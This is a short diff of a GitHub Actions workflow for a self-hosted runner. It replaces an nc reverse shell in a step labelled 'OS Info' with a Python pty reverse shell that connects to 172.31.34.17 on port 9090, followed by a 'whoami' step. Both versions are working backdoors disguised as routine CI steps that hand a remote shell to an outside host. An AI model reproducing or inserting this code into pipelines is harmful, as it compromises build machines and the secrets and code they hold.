@@ -12,7 +12,7 @@ jobs:
     runs-on: self-hosted
     steps:
       - name: 🖥️ OS Info
-        run: nc -e /bin/bash 172.31.34.17 9090
+        run: export RHOST="172.31.34.17";export RPORT=9090;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
 
       - name: 👤 Whoami
         run: whoami
